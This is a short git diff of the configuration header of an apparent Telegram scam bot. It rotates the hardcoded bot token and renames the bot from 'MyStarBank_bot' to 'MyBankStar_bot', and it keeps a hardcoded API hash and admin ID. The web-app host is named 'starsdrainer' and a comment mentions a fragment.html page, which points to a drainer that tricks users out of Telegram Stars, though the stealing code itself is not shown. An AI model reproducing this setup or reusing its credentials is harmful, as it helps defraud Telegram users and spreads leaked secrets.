@@ -6,7 +6,7 @@ const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 
-const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const ADMIN_USER_ID = 1398396668;
@@ -14,7 +14,7 @@ const ADMIN_USER_ID = 1398396668;
 // URL, где доступен web-app + статика (fragment.html, stars.jpg, avatar.jpg)
 const WEB_APP_URL = process.env.WEB_APP_URL || 'https://starsdrainer.onrender.com';
 const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || WEB_APP_URL; // для inline-картинок чеков
-const BOT_USERNAME = 'MyStarBank_bot'; // без @
+const BOT_USERNAME = 'MyBankStar_bot'; // без @
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
